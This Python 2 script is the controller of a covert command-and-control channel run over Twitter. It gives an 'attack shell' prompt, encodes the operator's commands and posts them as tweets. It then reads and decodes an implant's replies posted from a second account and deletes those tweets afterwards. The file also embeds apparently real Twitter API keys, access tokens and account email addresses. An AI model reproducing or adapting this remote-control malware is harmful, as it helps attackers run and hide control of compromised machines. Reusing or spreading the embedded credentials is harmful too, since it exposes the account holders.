import tweepy
from newEncrypt import *
import os 
from time import sleep

#lbwbchigh@yahoo.com
consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
consumer_secret = 'hbAZzMFdpff1sDHp50d4qt4l7QumyUfhxSybl5Smne1eTi2mEw'
access_token = '4827323871-Oig9GWZc6gkVUYK7oTkQO1O4dmoJLuCaY8vE6Dh'
access_token_secret = 'h2BMjDxt24XolArqy2vuRJYauMqKp2boNIgWUdHwlmGxD'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
api = tweepy.API(auth)

#krazykatphoenix@yahoo.com
#krazykatphoenix@yahoo.com
consumer_key = 'CEkMw02DlRrM7iFdsadhuAGWz'
consumer_secret = 'A3VVGro2sy2A0SSYLx3hD1Q4IFpa0lsobUKQ0HyAN5z6FZMf1X'
access_token = '701149655468527616-CznesGkPJEqyHGjtJTauqKPtUH9O2XJ'
access_token_secret = 'H4u8EiOe5THE8lPt51Oy4AxLyoleTpugEXIDqRbnRT5Ac'
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret )
apiTwo = tweepy.API(auth)

				   
def limit():
	data = api.rate_limit_status()
	value = str(data['resources']['statuses']['/statuses/user_timeline'])
	if (len(value) == 55):
		almost = value[-3:]
		remain= almost[:2]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)
	else:
		almost = value[-4:]
		remain= almost[:3]
		real = (int(remain) -4)
		print str(real) + " API calls remaining" 
		if( int(remain) == 4):
			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
			sleep(15*61)	
		
		
					   
if __name__ == "__main__":
	while True:
	 	flag = 0
	 	while (flag == 0):
			var = raw_input("twitter_attack$ ")
			msg = encode(var)
			if (len(msg) <= 140):
				flag = 1
			else:
				print '\n'
				print 'Error. Make sure the command you enter contains no more than 140 characters.'
				print '\n'
				
		if var == "exit":
			print "You have closed the attack shell. Manually delete tweets from Twitter pages."
			break
			
		elif var == "help":	
			print "HELP"
		else: 
			api.update_status(msg)
			#get and print implant response, might need timing feature
			sleep(5)
			new_public_tweets = apiTwo.user_timeline('krazykatphoenix')
			limit()
			
			for tweet in new_public_tweets:
				#print 'hello' 
				#print tweet.text
				test = str(tweet.text)
				bytes = str.encode(test)
				type(bytes)	
				mess = decode(bytes)
				print mess
				apiTwo.destroy_status(tweet.id)
				break
				#api.destroy_status(tweet.id)
				#sleep(3)
				#if app_count == 4:
        				#print "Sleeping for 15 minutes..."
        		
        				#app_count = 0
        				#sleep(61 * 15)
        		#else: 	
        			#continue
				
	
		#delete all posts		
		#for tweet in new_public_tweets:
			#api.destroy_status(tweet.id)
			
	
			
		
		
	
